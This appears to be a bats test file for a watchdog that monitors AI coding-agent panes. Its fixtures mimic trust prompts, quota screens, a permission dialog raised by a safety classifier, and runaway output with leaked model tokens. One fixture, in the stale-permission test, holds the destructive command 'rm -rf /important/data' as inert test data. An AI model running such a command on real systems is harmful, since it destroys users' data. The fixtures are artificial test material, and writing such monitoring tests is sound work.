# workers. Footer is `Enter to confirm`, marker is ASCII `>`, no `Esc to cancel`.
fx_prompt_trust() {
  frame_file prompt_trust <<'EOF'
Quick safety check: Is this a project you created or one you trust?
> 1. Yes, I trust this folder
2. No, exit
Enter to confirm
EOF
}

# Captured from the Codex worker hook-review prompt in WORKER_TASK.md. This is
# intentionally verbatim: Codex gets no broader prompt signature without a
# captured frame.
fx_codex_hooks_review() {
  frame_file codex_hooks_review <<'EOF'
Hooks need review
  1 hook is new or changed.
  Hooks can run outside the sandbox after you trust them.
› 1. Review hooks  2. Trust all and continue  3. Continue without trusting
EOF
}

fx_codex_hooks_review_reordered() {
  frame_file codex_hooks_review_reordered <<'EOF'
Hooks need review
  Hooks can run outside the sandbox after you trust them.
  1 hook is new or changed.
› 1. Review hooks  2. Trust all and continue  3. Continue without trusting
EOF
}

# The same trust frame scrolled into the transcript: the input box is the last
# non-empty line, so the geometry anchor must reject it (this is what keeps this
# very test file from being a false-positive source).
fx_prompt_scrollback() {
  frame_file prompt_scrollback <<'EOF'
> 1. Yes, I trust this folder
2. No, exit
Enter to confirm
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
  -- INSERT -- ⏵⏵ auto mode on (shift+tab to cycle)
EOF
}

# Same, with the option-select footer, to assert the widening is symmetric.
fx_select_scrollback() {
  frame_file select_scrollback <<'EOF'
  5. Chat about this
Enter to select · Tab/Arrow keys to navigate · Esc to cancel
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
  -- INSERT -- ⏵⏵ auto mode on (shift+tab to cycle)
EOF
}

# fx_bgwait_* — finished claude turns parked on a background shell, captured
# from healthy workers (claude Code v2.1.280, #353). The `❯` line is a prompt
# SUGGESTION, not unsent input.
fx_bgwait_crunched() {
  frame_file bgwait_crunched <<'EOF'
✻ Crunched for 1m 12s · done 11:16 AM · 1 shell still running
────────────────── reef ─
❯ push it and re-post pr_open once CI is green
──────────────────
  🤖 Opus 5.5 🧠 high | 📊 350k/1M | ⚡ 29% (1h53m → 13:10)
  -- INSERT -- ⏵⏵ auto mode on · PR #331 · 1 shell · ← for agents
EOF
}

fx_bgwait_churned() {
  frame_file bgwait_churned <<'EOF'
✻ Churned for 36s · done 11:20 AM · 1 shell still running
──────────────────
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · 1 shell · ← for agents
EOF
}

# The same finished turn with the shell gone: nothing is being waited on.
fx_bgwait_noshell() {
  frame_file bgwait_noshell <<'EOF'
✻ Churned for 36s · done 11:20 AM
──────────────────
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
}

# A3 — a finished/idle pane: no meter, no prompt, ends on the input box.
fx_idle_box() {
  frame_file idle_box <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
  -- INSERT -- ⏵⏵ auto mode on (shift+tab to cycle) · ← 3 agents
EOF
}

# fx_meter <clock> <tokens> — D2's shape: a live meter with NO live subagent
# row. The `⎿ Done` history line is included on purpose: it is the decoy that
# must NOT read as a subagent row, or D2 would be neutered forever.
fx_meter() {
  frame_file "meter.$1.$2" <<EOF
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✳ Perusing… ($1 · ↓ $2 tokens · thinking more with high effort)
EOF
}

# fx_subbatch <parent-clock> <subagent-elapsed> — A1's measured false-positive
# driver, pane %129, verbatim shape: meter present, clock rising, parent token
# string static at 73.2k, and a LIVE subagent row painted throughout.
fx_subbatch() {
  frame_file "subbatch.$1.$2" <<EOF
  ⎿  Done (15 tool uses · 77.2k tokens · 5m 53s)
✶ Hatching… ($1 · ↓ 73.2k tokens)
  ◯ general-purpose  Revise spec per critic                              $2 · ↓ 71.5k tokens
EOF
}

# [#31]'s transcription — ASCII-fied `·`/`↓`/`…`. Must NOT match the meter ERE.
fx_meter_transcribed() {
  frame_file meter_transcribed <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
Considering... 1h 20m - 28.0k tokens
EOF
}

# fx_meter_hours <clock> — the reconstructed ≥1h wire form (A2, uncaptured).
fx_meter_hours() {
  frame_file "meter_hours.$1" <<EOF
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
Considering… ($1 · ↓ 28.0k tokens)
EOF
}

# fx_prompt_quota — the rate-limit prompt from issue #58's transcript.
# RECONSTRUCTED, not captured: no frame of this prompt exists in
# EVIDENCE-2026-08-10.txt (same caveat as fx_meter_hours's "uncaptured"
# note above). Footer/geometry assumed to match every other measured
# option-select frame in this file.
fx_prompt_quota() {
  frame_file prompt_quota <<'EOF'
What do you want to do?
❯ 1. Stop and wait for limit to reset
  2. Upgrade your plan
  3. Upgrade to Team plan
Enter to select · Esc to cancel
EOF
}

# fx_prompt_trust_with_distant_quota_text — a GENUINE, different prompt (the
# workspace-trust frame) whose visible screen also happens to contain the
# literal quota phrase, but more than 12 non-empty lines above the trust
# prompt's own footer — i.e. outside _is_quota_prompt's search window.
# Guards against classifying a real, answerable prompt as quota: merely
# because that phrase is visible somewhere higher on the same screen (e.g. a
# worker with DISPATCHER_PROTOCOL.md scrolled into view).
fx_prompt_trust_with_distant_quota_text() {
  frame_file prompt_trust_distant <<'EOF'
Reviewing DISPATCHER_PROTOCOL.md: `quota:` fires on Stop and wait for limit to reset.
line 2 filler
line 3 filler
line 4 filler
line 5 filler
line 6 filler
line 7 filler
line 8 filler
line 9 filler
line 10 filler
line 11 filler
line 12 filler
Quick safety check: Is this a project you created or one you trust?
> 1. Yes, I trust this folder
2. No, exit
Enter to confirm
EOF
}

# fx_session_limit_refusal — captured verbatim from a real wedged worker in
# issue #93, not reconstructed (contrast fx_prompt_quota's note above). A
# working-pane shape: normal status bar, no option-select prompt.
fx_session_limit_refusal() {
  frame_file session_limit_refusal <<'EOF'
⏺ Monitor event: "idle wait for wave 2 reports"
  ⎿  You've hit your session limit · resets 7pm (Asia/Jerusalem)
     /upgrade to increase your usage limit.

──────────────────────────────────────────── bronze ─
❯ keep going
─────────────────────────────────────────────────────
  ⚠ /low-priority to continue now at lower priority · uses your weekly limit
  🤖 Opus 5 🧠 high | 📊 350k/1M                                    /rc
  ⏵⏵ auto mode on (shift+tab to cycle) · ← 3 agents
EOF
}

# fx_prompt_trust_with_distant_session_limit_text — mirrors
# fx_prompt_trust_with_distant_quota_text for the other quota variant: a real
# workspace-trust prompt with the three session-limit anchors pushed above
# _is_quota_session_limit's tail window, as they would be for a worker that
# merely has this repo's own doc text on screen.
fx_prompt_trust_with_distant_session_limit_text() {
  frame_file prompt_trust_distant_session_limit <<'EOF'
⏺ Monitor event: "idle wait for wave 2 reports"
  ⎿  You've hit your session limit · resets 7pm (Asia/Jerusalem)
     /upgrade to increase your usage limit.
  ⚠ /low-priority to continue now at lower priority · uses your weekly limit
line 1 filler
line 2 filler
line 3 filler
line 4 filler
line 5 filler
line 6 filler
line 7 filler
line 8 filler
line 9 filler
line 10 filler
line 11 filler
line 12 filler
line 13 filler
line 14 filler
line 15 filler
Quick safety check: Is this a project you created or one you trust?
> 1. Yes, I trust this folder
2. No, exit
Enter to confirm
EOF
}

# fx_cursor_monthly_limit — captured today from a dead cursor-agent worker pane
# (#630), sanitised: a generic path and branch, same structure. The lines above
# and below were ordinary UI chrome.
fx_cursor_monthly_limit() {
  frame_file cursor_monthly_limit <<'EOF'
  Grok 4.7 256K Low                                   Run Everything -- INSERT --
  ~/src/.worktrees/example/fix-some-branch · fix/some-branch · #123

  Error: You've reached your monthly usage limit
  Request higher limits to continue using Cursor
  fallbackModel:
  spendLimitHit: true
  chatMessage:
EOF
}

# fx_cursor_monthly_limit_distant — the same two anchors pushed above
# _is_quota_cursor_limit's tail window, with a normal cursor idle frame at the
# bottom. Mirrors the claude distant-text fixtures: guards against classifying
# a worker that merely has the frame in scrollback as quota: (sticky and
# escalation-exempt).
fx_cursor_monthly_limit_distant() {
  frame_file cursor_monthly_limit_distant <<'EOF'
  Error: You've reached your monthly usage limit
  Request higher limits to continue using Cursor
  fallbackModel:
  spendLimitHit: true
  chatMessage:
line 1 filler
line 2 filler
line 3 filler
line 4 filler
line 5 filler
line 6 filler
line 7 filler
line 8 filler
line 9 filler
line 10 filler
line 11 filler
line 12 filler
  Cursor Agent
  v1.0.0-abc
  → Plan, search, build anything
  ~/src/.worktrees/example/fix-some-branch · fix/some-branch · #123
EOF
}

# The REAL tool-permission dialog (#435), captured verbatim from a live worker
# pane by the dispatcher on 2026-09-26: crew 1790450482-1903888, worker coral on
# #443, pane %78 (82x36), Claude Code 2.1.283 — a subagent (the shell-reviewer)
# raised it while the lead showed "Waiting for 1 background agent to finish".
# The footer is `Esc to cancel · Tab to amend`, NOT
# `Enter to select`/`Enter to confirm` — which is why _is_prompt misses it.
# A top-level capture was attempted (2026-09-27, claude 2.1.283,
# --permission-mode auto) but this environment's auto classifier approved every
# probe, so no real top-level frame exists yet; fx_permission_bash is a
# follow-up issue and the matcher relies only on lines present in THIS capture.
# No top-level frame was synthesised and labelled real.
fx_permission_subagent() {
  frame_file permission_subagent <<'EOF'

● Waiting on the shell reviewer and test-runner.

✻ Waiting for 1 background agent to finish

› Message from @a6fd725715048d707 (ctrl+o to expand)

● The test-runner confirmed every acceptance criterion passes on the branch, and
  the allowlist tests fail on main. Only the shell reviewer is still out.

✻ Waiting for 2 background agents to finish

● Agent "Review: targeted test-runner" finished · 16m 44s

● Waiting on the shell reviewer.

✻ Waiting for 1 background agent to finish

──────────────────────────────────────────────────────────────────────────────────
 Bash command · from the shell-reviewer agent

   bats --filter grant tests/dispatch-resume.bats 2>&1 | tail -30
   Run bats tests matching grant filter in dispatch-resume.bats

 │ Auto mode classifier requires confirmation for this command.
 │ 3 consecutive actions were blocked. Please review the transcript before
 │ continuing.
 │
 │ Latest blocked action: [Irreversible Local Destruction]

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: bats *
   3. No

 Esc to cancel · Tab to amend
EOF
}

# DERIVED (not captured): the same dialog scrolled into the transcript. The
# input box / mode line is the last non-empty line, so the footer-last geometry
# must reject it — exactly what keeps this repo's own fixture text from being a
# false-positive source.
fx_permission_scrollback() {
  frame_file permission_scrollback <<'EOF'
 Bash command · from the shell-reviewer agent
   bats --filter grant tests/dispatch-resume.bats 2>&1 | tail -30
   Run bats tests matching grant filter in dispatch-resume.bats
 │ Auto mode classifier requires confirmation for this command.
 │ Latest blocked action: [Irreversible Local Destruction]
 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: bats *
   3. No
 Esc to cancel · Tab to amend
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
  -- INSERT -- ⏵⏵ auto mode on (shift+tab to cycle)
EOF
}

# DERIVED (not captured): the real frame with a >200-char request line carrying
# a RAW ESC sequence, to pin _permission_detail's control/ESC stripping. The ESC
# is emitted by command substitution on purpose: `$'\x1b…'` does NOT expand
# inside a heredoc (it stays the literal characters), which would make the
# sanitize assertion vacuous.
fx_permission_sanitize() {
  frame_file permission_sanitize <<EOF
 Bash command · from the shell-reviewer agent

   $(printf 'x%.0s' {1..220}) $(printf '\x1b[31mRED\x1b[0m') $(printf 'y%.0s' {1..20})
   Run a very long command

 │ Auto mode classifier requires confirmation for this command.

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: bats *
   3. No

 Esc to cancel · Tab to amend
EOF
}

# stall-watch finished-worker release: the watchdog releases its own worker's
# window after done + --release with no stream or reap running.
_release_setup() {
  git commit --allow-empty -q -m init
  git branch feat/x
  rel_wt="$BATS_TEST_TMPDIR/rel-wt"
  git worktree add -q "$rel_wt" feat/x
  rel_wt=$(cd "$rel_wt" && pwd -P)
  stub_tmux "$(printf '@23\tsage\t%s\n' "$rel_wt")" "$(printf '@23\t%%9\tclaude\n')"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
}

fx_done_idle() {
  frame_file done_idle <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
}

@test "stall-watch: releases its worker's window after done + --release on an idle frame" {
  _release_setup
  p=$(fx_done_idle)
  stall_sampler "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 10 --release 1
  [ "$status" -eq 0 ]
  grep -q 'kill-window -t @23' "$STUB_LOG"
  [ -d "$rel_wt" ]
  run bash -c "bus | jq -r 'select(.kind==\"release\") | \"\(.branch) \(.state)\"'"
  [ "$output" = "feat/x done" ]
}

@test "stall-watch: does not release while the pane shows a live turn" {
  _release_setup
  p=$(fx_meter 1m2s 3.1k)
  stall_sampler "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 5 --release 1
  [ "$status" -eq 0 ]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "stall-watch: D1 posts blocked/prompt: on the option-select frame" {
  p=$(fx_prompt_select)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|prompt: interactive prompt in pane %9 —"* ]]
}

@test "stall-watch: a blocked post marks the pane source watchdog" {
  stub_bin tmux
  p=$(fx_prompt_select)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  [ "$status" -eq 0 ]
  run grep -F -- 'set-option -p -t %9 @crew_state blocked' "$STUB_LOG"
  [ "$status" -eq 0 ]
  run grep -F -- 'set-option -p -t %9 @crew_source watchdog' "$STUB_LOG"
  [ "$status" -eq 0 ]
}

@test "stall-watch: D1 fires on the workspace-trust frame outside the startup window" {
  # Criterion 4b — the widened footer set lives in D1's own signature set, not
  # only in D0's classifier.
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 3
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == prompt:* ]]
}

@test "stall-watch: session-3 regression — a static trust prompt is prompt:, never failed or stalled:" {
  # The measured 3/3 false positive. A pane byte-static across the whole --stall
  # window, inside --window, carrying the trust frame.
  # --max-life 8: the single expected event must fire before the top-of-loop
  # exit; at 4 a stretched pre-sample gap could starve it (#185, same as D0's
  # fix below).
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == prompt:* ]]
  run bash -c "bus | grep -c '\"state\":\"failed\"' || true"
  [ "$output" = "0" ]
  run bash -c "bus | grep -c 'stalled:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: the real tool-permission frame posts blocked/prompt: permission" {
  # #435 regression: on main _is_prompt misses this frame because its footer is
  # `Esc to cancel · Tab to amend`, not `Enter to select`/`Enter to confirm`,
  # so nothing posts and the worker waits silently (#413: 1516 s).
  p=$(fx_permission_subagent)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|prompt: permission — Bash command: bats --filter grant tests/dispatch-resume.bats 2>&1 | tail -30 — pane %9" ]]
}

@test "stall-watch: a static permission frame is prompt:, never stalled:" {
  # D0 defers to D1 for prompt frames; without the permission deferral a static
  # permission frame inside --window would also raise `stalled: no output`.
  p=$(fx_permission_subagent)
  stall_sampler "$p" "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == prompt:* ]]
  run bash -c "bus | grep -c 'stalled:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: the permission dialog scrolled into the transcript posts nothing" {
  p=$(fx_permission_scrollback)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  [ "$status" -eq 0 ]
  run bash -c "bus | grep -c . || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a permission detail is one line, ESC-free and capped at 160" {
  p=$(fx_permission_sanitize)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "prompt: permission — Bash command: "* ]]
  [[ "${lines[0]}" == *" — pane %9" ]]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail | length'"
  [ "$output" -le 160 ]
  # _post JSON-encodes a surviving ESC as \u001b; a raw-ESC grep would be a tautology.
  run bash -c "bus | grep -c 'u001b' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: a stale permission dialog above the live one does not poison the detail" {
  # The header is the LAST `· from the … agent` line in the capture: a prior
  # permission block scrolled into the transcript must not be reported while
  # the live dialog is the one parked at the bottom.
  p=$(frame_file permission_stale <<'EOF'
 Bash command · from the lead agent
   rm -rf /important/data
   Delete everything

 Bash command · from the shell-reviewer agent

   bats --filter grant tests/dispatch-resume.bats 2>&1 | tail -30
   Run bats tests matching grant filter in dispatch-resume.bats

 │ Auto mode classifier requires confirmation for this command.

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: bats *
   3. No

 Esc to cancel · Tab to amend
EOF
)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "prompt: permission — Bash command: bats --filter grant"* ]]
  [[ "${lines[0]}" != *"rm -rf"* ]]
}

@test "stall-watch: a permission frame with no header detail still fires (unparsed)" {
  p=$(frame_file permission_unparsed <<'EOF'
 │ Auto mode classifier requires confirmation for this command.
 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: bats *
   3. No
 Esc to cancel · Tab to amend
EOF
)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "prompt: permission — (unparsed) — pane %9" ]
}

@test "stall-watch: role mode posts a permission prompt under the role id" {
  p=$(fx_permission_subagent)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch role:feat/x:reviewer --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.from)|\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "role:feat/x:reviewer|blocked|watchdog|prompt: permission — "* ]]
  run bash -c "bus | grep -c '\"from\":\"worker:feat/x\"' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: the permission detector does not steal the trust frame" {
  p=$(fx_prompt_trust)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "prompt: interactive prompt in pane %9 —"* ]]
}

@test "stall-watch: the permission detector does not steal the quota frame" {
  p=$(fx_prompt_quota)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == quota:* ]]
}

@test "stall-watch: the permission detector does not steal the session-limit frame" {
  p=$(fx_session_limit_refusal)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 4
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == quota:* ]]
}

@test "stall-watch: D0 posts blocked with a diagnosis-free stalled: detail" {
  # Full-string match on purpose: a reintroduced `(suspected …)` fails CI.
  # --max-life 8 gives D0 (`--stall 1`) headroom: at `--max-life 3` one
  # stretched pre-sample gap could exit the loop before the second sample and
  # starve the single expected event (#185).
  p=$(fx_idle_box)
  stall_sampler "$p" "$p" "$p" "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 60 --stall 1 --idle 999 --dead 999 --max-life 8
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "blocked|stalled: no output for 1s" ]
}

@test "stall-watch: CREW_CLOCK runs a ten-minute watch on virtual time" {
  # Ten virtual minutes outlast D4's 300s --load window, so pin a calm host.
  export CREW_STALL_LOAD_CMD='printf "1.0 32\n"'
  p=$(fx_idle_box)
  stall_sampler "$p"
  SECONDS=0
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --interval 60 --window 600 --stall 120 --idle 99999 --dead 99999 --max-life 600
  [ "$status" -eq 0 ]
  # In real time this run would take 645s (45s default grace + 600s life).
  [ "$SECONDS" -lt 60 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "blocked|stalled: no output for 120s" ]
}

@test "stall-watch: D2 posts blocked/turn-stall: when the clock advances and tokens do not" {
  a=$(fx_meter "5m 29s" "25.0k")
  b=$(fx_meter "5m 44s" "25.0k")
  c=$(fx_meter "5m 59s" "25.0k")
  d=$(fx_meter "6m 14s" "25.0k")
  stall_sampler "$a" "$b" "$c" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --max-life 5
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [ "${lines[0]}" = "blocked|watchdog" ]
  run bash -c "bus | jq -r '.body.detail'"
  [[ "$output" == "turn-stall: token count static at 25.0k for "* ]]
}

@test "stall-watch: D2 reads the reconstructed 1h meter and ignores #31's transcription" {
  # The hours alternative of the meter ERE (A2 is a documented false-negative
  # risk per C-4, not a gate) — and the ASCII-fied paste must stay unmatched.
  a=$(fx_meter_hours "1h 20m")
  stall_sampler "$a" "$a" "$a" "$a"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --max-life 5
  run bash -c "bus | grep -c 'turn-stall:' || true"
  [ "$output" = "0" ] # clock never changed: a static capture is not evidence

  rm -f "$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  a=$(fx_meter_hours "1h 20m")
  b=$(fx_meter_hours "1h 21m")
  c=$(fx_meter_hours "1h 22m")
  stall_sampler "$a" "$b" "$c" "$c"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --max-life 5
  run bash -c "bus | grep -c 'turn-stall:' || true"
  [ "$output" = "1" ]

  rm -f "$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  t=$(fx_meter_transcribed)
  stall_sampler "$t" "$t" "$t" "$t"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine claude \
    --grace 0 --interval 1 --window 0 --idle 2 --dead 999 --max-life 5
  run bash -c "bus | grep -c 'turn-stall:' || true"
  [ "$output" = "0" ] # no meter matched → D2 has nothing to read
}

# ---- D7 runaway: (#650) -----------------------------------------------------
# fx_pi_runaway <down-tokens> — the 2026-10-02 incident, RECONSTRUCTED from the
# issue description (no raw capture): a leaked DeepSeek sentinel followed by a
# word-salad stream, pi footer with a climbing `↓`.
fx_pi_runaway() {
  frame_file "pi_runaway.$1" <<EOF
I'll trust evidence/inspection-based verification <｜end▁of▁thinking｜> dragon phoenix griffin
kraken quark lepton boson carabiner piton cam nut granite basalt gneiss schist chert obsidian
entropy enthalpy torque momentum inertia viscosity catalyst isotope lattice manifold
─────────────────────────────────────────────────────────────────────
⠇ Working
↑50k ↓$1 R1.6M CH99.2% \$0.027 8.7%/1.0M (auto)
EOF
}

# fx_pi_busy <down-tokens> — a normal busy pi frame: prose, no sentinel.
fx_pi_busy() {
  frame_file "pi_busy.$1" <<EOF
I'll read the config first, then adjust the watchdog flags and run the suite.
─────────────────────────────────────────────────────────────────────
⠇ Working
↑50k ↓$1 R1.6M CH99.2% \$0.027 8.7%/1.0M (auto)
EOF
}

# fx_claude_tool_sentinel <tokens> — claude reading a file that contains
# sentinel strings: they sit inside a `⎿` tool-result block.
fx_claude_tool_sentinel() {
  frame_file "claude_toolsent.$1" <<EOF
⏺ Read(adapters/core/crew.sh)
  ⎿  re_sentinel='<｜[^｜>]{1,40}｜>|<|im_end|>'
     <｜end▁of▁thinking｜> appears in this fixture
     <|endoftext|>
⏺ Now I will update the detector.
✳ Perusing… (1m 2s · ↓ $1 tokens · thinking)
EOF
}

# fx_pi_tool_sentinel <down-tokens> — the same, in pi's expanded tool output.
fx_pi_tool_sentinel() {
  frame_file "pi_toolsent.$1" <<EOF
Tool output: read adapters/core/crew.sh
  re_sentinel='<｜[^｜>]{1,40}｜>' and <|im_end|> appear in the fixture

Now I will update the detector.
─────────────────────────────────────────────────────────────────────
⠇ Working
↑50k ↓$1 R1.6M CH99.2% \$0.027 8.7%/1.0M (auto)
EOF
}

# fx_claude_long_answer <tokens> — a long, legitimate, punctuated answer.
fx_claude_long_answer() {
  frame_file "claude_long.$1" <<EOF
⏺ Here is the full analysis. The watchdog samples the pane every fifteen seconds, and
  each detector keeps its own episode state; when the evidence goes away, it posts a
  clearance. First, the prompt detector requires a verified geometry. Second, the
  quiet detector requires byte identity. Third, the load detector reads the host.
✳ Composing… (2m 1s · ↓ $1 tokens · thinking)
EOF
}

runaway_flags=(--grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 6 --runaway-hits 3 --runaway-tokens 1500)

@test "stall-watch: D7 posts blocked/runaway: on the pi incident frame" {
  a=$(fx_pi_runaway 19.0k)
  b=$(fx_pi_runaway 19.8k)
  c=$(fx_pi_runaway 20.5k)
  d=$(fx_pi_runaway 21.2k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine pi "${runaway_flags[@]}"
  run bash -c "bus | jq -r 'select(.kind==\"status\") | \"\(.body.state)|\(.body.source)|\(.body.detail)\"'"
  [ "${#lines[@]}" -eq 1 ]
  [[ "${lines[0]}" == "blocked|watchdog|runaway: leaked model sentinel in pane %9"* ]]
}

@test "stall-watch: D7 stays silent when the sentinel persists but tokens do not grow" {
  a=$(fx_pi_runaway 19.0k)
  stall_sampler "$a" "$a" "$a" "$a" "$a"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x --pane %9 --engine pi "${runaway_flags[@]}"
  run bash -c "bus | grep -c 'runaway:' || true"
  [ "$output" = "0" ]
}

@test "stall-watch: D7 ignores a normal busy pi frame, however fast tokens climb" {
  a=$(fx_pi_busy 19.0k)
  b=$(fx_pi_busy 25.0k)
  c=$(fx_pi_busy 31.0k)
  d=$(fx_pi_busy 37.0k)
  stall_sampler "$a" "$b" "$c" "$d" "$d"
